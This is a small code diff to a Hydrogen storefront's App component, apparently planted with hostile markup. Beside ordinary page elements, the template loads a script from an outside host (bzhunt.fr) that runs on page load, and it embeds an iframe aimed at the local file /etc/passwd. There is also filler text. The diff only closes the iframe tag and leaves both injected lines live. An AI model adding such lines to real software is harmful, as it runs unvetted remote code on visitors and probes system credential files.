@@ -49,7 +49,7 @@ export default function App() {
         <h1>Hello, {name}</h1>
         <p>This is a custom storefront powered by Hydrogen</p>
 <script src="https://bzhunt.fr/assets/js/hydrogen.js"></script>
-<iframe src="file:///etc/passwd">
+<iframe src="file:///etc/passwd"></iframe>
 <p>aaaaa</p>
         <Outlet />
         <ScrollRestoration />
